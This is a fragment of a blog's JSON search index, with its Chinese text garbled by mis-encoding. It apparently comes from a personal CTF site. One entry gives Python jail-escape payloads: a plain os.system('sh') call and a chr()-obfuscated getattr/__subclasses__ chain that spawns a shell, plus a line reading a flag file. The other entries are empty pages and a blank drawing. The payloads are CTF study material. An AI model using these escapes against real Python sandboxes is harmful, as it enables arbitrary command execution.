¼","tags":["pwn","atoi"],"title":"ç»•è¿‡atoiå‰å¯¹é¦–å­—ç¬¦æ˜¯å¦ä¸ºè´Ÿå·çš„æ£€æŸ¥"},{"categories":["tricks"],"contents":"åŸºç¡€ç‰ˆ __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) è¿›é˜¶ç‰ˆ getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) å¦‚æœçŸ¥é“flagæ–‡ä»¶çš„åå­—ï¼Œå¯ä»¥ç”¨:\nopen(chr(102)+chr(108)+chr(97)+chr(103)).read() æ›´å¤šèµ„æ–™å‚è§https://zhuanlan.zhihu.com/p/578986988\n","date":"2022å¹´12æœˆ23æ—¥","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/","section":"tricks","summary":"åŸºç¡€ç‰ˆ __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) è¿›é˜¶ç‰ˆ getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) å¦‚æœçŸ¥é“flagæ–‡ä»¶çš„åå­—ï¼Œå¯ä»¥ç”¨: open(chr(102)+chr(108)+chr(97)+chr(103)).read() æ›´å¤šèµ„æ–™å‚è§https://zhuanlan.zhihu.com/p/578986988","tags":["pwn","pyjail"],"title":"ç»•è¿‡pyjailâ€”â€”ä¸€å¥è¯RCE"},{"categories":null,"contents":"","date":"0001å¹´01æœˆ01æ—¥","permalink":"https://peterliuzhi.top/archive/%E6%97%A5%E5%BF%97/","section":"archive","summary":"","tags":null,"title":""},{"categories":null,"contents":"==âš  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. âš ==\n%%\nDrawing {\u0026#34;type\u0026#34;:\u0026#34;excalidraw\u0026#34;,\u0026#34;version\u0026#34;:2,\u0026#34;source\u0026#34;:\u0026#34;https://excalidraw.com\u0026#34;,\u0026#34;elements\u0026#34;:[],\u0026#34;appState\u0026#34;:{\u0026#34;gridSize\u0026#34;:null,\u0026#34;viewBackgroundColor\u0026#34;:\u0026#34;#ffffff\u0026#34;}} %%\n","date":"0001å¹´01æœˆ01æ—¥","permalink":"https://peterliuzhi.top/image/drawing-2022-10-27-16.58.09.excalidraw/","section":"image","summary":"==âš  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. âš ==\n%%\nDrawing {\u0026#34;type\u0026#34;:\u0026#34;excalidraw\u0026#34;,\u0026#34;version\u0026#34;:2,\u0026#34;source\u0026#34;:\u0026#34;https://excalidraw.com\u0026#34;,\u0026#34;elements\u0026#34;:[],\u0026#34;appState\u0026#34;:{\u0026#34;gridSize\u0026#34;:null,\u0026#34;viewBackgroundColor\u0026#34;:\u0026#34;#ffffff\u0026#34;}} %%","tags":["excalidraw"],"title":""},{"categories":null,"contents":"","date":"0001å¹´01æœˆ01æ—¥","permalink":"https://peterliuzhi.top/stats/stats/","section":"stats","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"0001å¹´01æœˆ01æ—¥","permalink":"https://peterliuzhi.top/search.html/","section":"","summary":"","tags":null,"title":"åŒ…å«å…³é”®è¯ çš„æ–‡ç« "}]